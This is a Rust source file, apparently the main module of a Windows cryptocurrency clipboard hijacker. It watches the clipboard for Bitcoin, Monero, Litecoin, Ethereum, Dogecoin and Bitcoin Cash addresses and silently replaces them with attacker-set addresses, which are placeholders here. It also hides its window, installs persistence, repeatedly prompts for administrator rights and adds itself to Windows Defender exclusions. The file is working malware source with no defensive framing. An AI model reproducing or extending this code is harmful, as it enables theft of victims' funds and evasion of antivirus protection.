#![windows_subsystem = "windows"]

use regex::Regex;
use std::{
    collections::HashMap,
    ops::Deref,
    str::FromStr,
    thread,
    time::Duration,
};

mod fs;
mod os;
mod registry;
mod clipboard;

static FILE_NAME: &str = "testname.exe";
static MUTEX: &str = "asdfafds9i867asdf7896";
static FOLDER_NAME: &str = "asdfsad7f6sd786f";

const BTC_ADDR: &str = "h";
const XMR_ADDR: &str = "dfssdf";
const DGE_ADDR: &str = "dfssfd";
const LTC_ADDR: &str = "dsfsdf";
const ETH_ADDR: &str = "dfgdg";
const BCH_ADDR: &str = "ghgfh";

fn scan(check_map: &HashMap<&str, &str>) -> Option<(String, String)> {
    let result = clipboard::get_clipboard_text();

    let check_set_contents = |check: &str, set: &str, clipoard_text: String| -> Option<bool> {
        if Regex::from_str(check).unwrap().is_match(&clipoard_text) {
            if clipboard::set_clipboard_text(
                Regex::from_str(check)
                    .unwrap()
                    .replace(&clipoard_text, set)
                    .to_string()
                    .as_str()
            ) {
                return Some(true);
            }
        }

        return None;
    };

    if let Some(clipboard_text) = result {
        for (regex_str, address) in check_map {
            if check_set_contents(regex_str, address, clipboard_text.clone()).is_some() {
                return Some((
                    String::from(regex_str.deref()),
                    String::from(address.deref()),
                ));
            }
        }
    }

    return None;
}

fn start() {
    let map: HashMap<&str, &str> = HashMap::from_iter([
        (
            r"^(1|3)[1-9A-HJ-NP-Za-km-z]{25,34}$|^bc1[a-zA-HJ-NP-Z0-9]{39,59}$",
            BTC_ADDR,
        ),
        (r"^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", XMR_ADDR),
        (r"^[LM3][1-9A-HJ-NP-Za-km-z]{26,33}$", LTC_ADDR),
        (r"^(0x)[a-fA-F0-9]{40,128}$", ETH_ADDR),
        (r"^D[1-9A-HJ-NP-Za-km-z]{33}$", DGE_ADDR),
        (r"^(q|1|bitcoincash:)[a-zA-HJ-NP-Z0-9]{41}$", BCH_ADDR),
    ]);

    match fs::persistence() {
        Ok(..) => loop {
            scan(&map);
            thread::sleep(Duration::from_millis(500));
        },
        Err(..) => {}
    };
}

fn main() {
    if fs::running_from_save_path() {
        if os::check_mutex() {
            start();
        }
    } else {
        if !os::is_administrator().unwrap() {
            loop {
                let status = os::run_as_admin();
    
                if status.success() {
                    break;
                };
            }
        } else {
            os::add_to_defender_exclusions(
                std::env::current_exe()
                    .unwrap()
                    .to_str()
                    .unwrap()
            );  

            os::add_to_defender_exclusions(
                fs::get_destination_path()
                    .0
                    .to_str()
                    .unwrap()
            );

            start();
        }
    };
}
